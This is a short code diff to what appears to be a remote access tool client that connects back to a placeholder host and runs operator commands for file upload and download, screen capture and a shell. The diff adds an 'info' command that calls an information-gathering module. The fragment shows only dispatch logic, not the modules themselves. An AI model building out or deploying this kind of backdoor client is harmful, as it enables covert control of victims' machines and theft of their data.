@@ -10,6 +10,7 @@ from lib.dsSocket import *
 from clientModule.screen import Screen
 from clientModule.shell import Shell
 from clientModule.fileOperation import FileOPT
+from clientModule.infoGather import InfoGather
 
 def connect():
     host = "$HOST$"
@@ -25,6 +26,8 @@ def connect():
             FileOPT(client, cmd).upload()
         elif cmd[:8] == "download":
             FileOPT(client, cmd).download()
+        elif cmd == "info":
+            InfoGather(client)
         elif cmd == "screen":
             Screen(client)
         elif cmd in ["quit", "q", "exit"]:
